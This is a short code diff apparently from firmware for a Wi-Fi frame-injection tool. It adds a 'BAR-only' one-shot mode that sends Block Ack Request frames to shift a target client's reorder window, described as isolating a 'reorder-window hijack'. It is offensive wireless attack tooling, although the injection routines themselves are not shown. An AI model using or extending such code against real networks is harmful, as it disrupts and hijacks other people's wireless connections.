@@ -109,6 +109,7 @@ uint32_t s_ba_pause_until;
 // starvation, which is the only way to tell a reorder-window hijack apart from a
 // plain injection flood.
 bool s_ba_oneshot;
+bool s_ba_bar_only;   // one-shot sends only BARs (isolates the window update)
 uint32_t s_ba_plant_frames;
 
 client_t s_clients[kMaxClients];
@@ -444,7 +445,13 @@ void delba_step(void) {
                         if ((mask & (1u << tid)) == 0 || budget == 0) {
                             continue;
                         }
-                        if (!ba_plant(dir, c->mac, c, tid)) {
+                        // bar_only: no ADDBA, no DELBA -- only the BAR that walks
+                        // WinStartB. That is the one frame the standard lets a
+                        // receiver use to move its window, so an effect here cannot
+                        // be blamed on session churn.
+                        const bool ok = s_ba_bar_only ? ba_push(dir, c->mac, c, tid)
+                                                      : ba_plant(dir, c->mac, c, tid);
+                        if (!ok) {
                             s_ba_pause_until = millis() + 5;
                             return;
                         }
@@ -657,8 +664,19 @@ bool delba_ba_plant_once(int index, uint16_t ssn_step) {
         return false;
     }
     s_ba_oneshot = true;
+    s_ba_bar_only = false;
     s_ba_plant_frames = 0;
     s_ba_round = 0;
+    return true;
+}
+
+// Same one-shot pass but with BAR frames only: isolates "the receiver moved its
+// reorder window" from "the session state was rewritten".
+bool delba_ba_bar_once(int index, uint16_t ssn_step) {
+    if (!delba_ba_plant_once(index, ssn_step)) {
+        return false;
+    }
+    s_ba_bar_only = true;
     return true;
 }
 
